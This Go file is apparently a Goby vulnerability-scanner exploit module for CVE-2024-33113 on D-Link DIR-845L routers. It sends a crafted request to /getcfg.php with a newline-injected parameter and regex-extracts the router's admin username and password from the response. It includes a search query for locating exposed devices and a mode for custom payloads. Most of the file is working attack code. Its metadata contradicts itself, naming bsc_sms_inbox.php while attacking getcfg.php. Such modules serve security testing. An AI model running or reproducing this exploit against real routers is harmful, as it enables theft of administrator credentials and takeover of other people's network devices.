package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "D-LINK-DIR-845L /getcfg.php Information Disclosure Vulnerability(CVE-2024-33113)",
    "Description": "<p>The D-Link DIR-845L router is a Gigabit wireless router that provides stable wireless connectivity, cloud service capabilities, and advanced security features. </p><p>CVE-2024-33113 is a vulnerability in the D-LINK DIR-845L router that allows information to be leaked through the bsc_sms_inbox.php file. This vulnerability is caused by improper handling of the include() function and can be exploited by manipulating the $file variable. This allows an attacker to include arbitrary PHP scripts and potentially retrieve sensitive information, such as the router's username and password.</p>",
    "Product": "D-LINK DIR-845L",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2024-05-06",
    "PostTime": "2024-09-13",
    "Author": "3013320359@qq.com",
    "FofaQuery": "banner=\"DIR-845L\" && banner=\"chunker\" || server=\"DIR-845L\"",
    "GobyQuery": "banner=\"DIR-845L\" && banner=\"chunker\" || server=\"DIR-845L\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2024-33113"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "D-LINK-DIR-845L /getcfg.php 信息泄露漏洞（CVE-2024-33113）",
            "Product": "D-Link DIR-845L路由器",
            "Description": "<p>D-Link DIR-845L路由器是一款千兆无线路由器，提供稳定的无线网络连接、云服务功能以及高级的安全特性。<br></p><p>CVE-2024-33113 是 D-LINK DIR-845L 路由器中的一个漏洞，允许通过 bsc_sms_inbox.php 文件泄露信息。该漏洞是由于对 include() 函数处理不当而引起的，可以通过操纵 $file 变量来利用该漏洞。这使得攻击者可以包含任意 PHP 脚本并可能检索敏感信息，例如路由器的用户名和密码。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "D-LINK-DIR-845L /getcfg.php Information Disclosure Vulnerability(CVE-2024-33113)",
            "Product": "D-LINK DIR-845L",
            "Description": "<p>The D-Link DIR-845L router is a Gigabit wireless router that provides stable wireless connectivity, cloud service capabilities, and advanced security features.&nbsp;</p><p>CVE-2024-33113 is a vulnerability in the D-LINK DIR-845L router that allows information to be leaked through the bsc_sms_inbox.php file. This vulnerability is caused by improper handling of the include() function and can be exploited by manipulating the $file variable. This allows an attacker to include arbitrary PHP scripts and potentially retrieve sensitive information, such as the router's username and password.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	postOrGet_FXtlpHM9o8 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/getcfg.php?a=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/getcfg.php?a="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1": "password",
			}
			// 函数继承
			uploadFileFunc := postOrGet_FXtlpHM9o8

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1", "password"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_FXtlpHM9o8

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular_name := `<name>(.*?)</name>`
			regular_pwd := `<password>(.*?)</password>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				if len(getname) > 1 {
					return getname[1], nil // 返回第一个捕获组的内容
				}
				return "", fmt.Errorf("no value found")
			}

			output_name, err := makeRegular(resp, regular_name)
			output_pwd, err := makeRegular(resp, regular_pwd)

			expResult.Success = true
			expResult.Output = "路由器账号：" + output_name + "\n" + "路由器密码：" + output_pwd
			return expResult
		},
	))
}
